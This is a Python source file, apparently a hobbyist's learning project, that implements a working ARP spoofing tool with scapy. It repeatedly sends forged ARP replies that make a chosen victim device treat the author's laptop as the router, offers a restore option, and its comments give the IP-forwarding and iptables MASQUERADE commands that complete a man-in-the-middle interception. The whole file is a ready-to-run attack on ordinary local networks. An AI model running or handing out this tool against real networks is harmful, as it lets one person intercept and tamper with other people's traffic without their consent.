import sys
import time
import argparse
from scapy.all import ARP, Ether, srp1, sendp, get_if_hwaddr

iface = "wlp2s0"  # change if needed

def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    resp = srp1(pkt, timeout=2, iface=iface, verbose=False)
    return resp[Ether].src if resp else None
    #send ARP out asking to all whos IP this is and get their MAC

def restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac):
    print("[*] Restoring ARP tables...")
    #so my phone doesnt have to wait ages to restore its own tables
    #ofc assuming im not forwarding
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        psrc=spoofed_ip,
        hwsrc=spoofed_mac,
        pdst=target_ip,
        hwdst=target_mac
    )
    sendp(pkt, iface=iface, count=5, verbose=False)
    #sends my phone a packet saying what the routers IP and shit is

def start_spoofer(spoofed_ip, target_ip):
    target_mac = get_mac(target_ip)
    spoofed_mac = get_mac(spoofed_ip)
    #get both MACs

    print("Target MAC:", target_mac)
    print("Spoofed MAC:", spoofed_mac)


    if not target_mac:
        print(f"[-] Could not get MAC for {target_ip}")
        sys.exit(1)

    print(f"[+] Spoofing {target_ip} as {spoofed_ip}")
    try:
        while True:
            pkt = Ether(dst=target_mac) / ARP(
                op=2,
                psrc=spoofed_ip,
                pdst=target_ip,
                hwdst=target_mac
            )
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(2)
        #CONTINUSOULY spam the victim with fake ARP replies (op = 2)
        #sayin "im the router"
        #around every 2 seconds app

    except KeyboardInterrupt:
        print("\n[+] Spoofing stopped.")
        restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)
        #stop it calls this with the args

#script run directly not imported
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("spoofed_ip", nargs="?", help="IP to pretend to be")
    parser.add_argument("target_ip", nargs="?", help="Victim IP")
    parser.add_argument("--restore", action="store_true", help="Restore ARP")
    #adds the args


    args = parser.parse_args()
    #gets them

    if args.restore:
        if not args.spoofed_ip or not args.target_ip:
            print("Usage: python3 spoofer.py --restore <spoofed_ip> <target_ip>")
            sys.exit(1)
        spoofed_mac = get_mac(args.spoofed_ip)
        target_mac = get_mac(args.target_ip)
        restore_arp(args.target_ip, target_mac, args.spoofed_ip, spoofed_mac)
        #self explanatory
    else:
        if not args.spoofed_ip or not args.target_ip:
            print("Usage: python3 spoofer.py <spoofed_ip> <target_ip>")
            sys.exit(1)
        start_spoofer(args.spoofed_ip, args.target_ip)
        #same here


#sudo sysctl -w net.ipv4.ip_forward=1
#sudo iptables -t nat -A POSTROUTING -o wlp2s0 -j MASQUERADE
#for forwarding

#sudo sysctl -w net.ipv4.ip_forward=0



#so for example my phone wants to ping 8.8.8.8 -> sends packet to router 192.168.1.1
#BUT due to spoofing the MAC address for 192.168.1.1 points to my laptop (not the real router)

#therefore the packet still has a destination of 8.8.8.8 
#it arrives at my laptop because its impersonating the router at the MAC layer

#the forward command enables packet forwarding
#this allows my laptop to forward that packet out to the real router

#the packet is now on its way to 8.8.8.8 as normal (sent from my laptop)



#the iptables MASQUERADE rule rewrites the source IP of the packet before it leaves my laptop
#it replaces my phone's IP (e.g. 192.168.1.181) with my laptop's own IP 
#this makes the router think the request came from my laptop, not from my phone

#why? because if i didn't do this the router would try to reply directly to the phone
#but the phone thinks it's talking to the router (not the real one) so the return packet would skip us

#MASQUERADE ensures the router replies come back to us (the spoofing laptop)
#then we forward those replies back to the phone (again pretending to be the router)

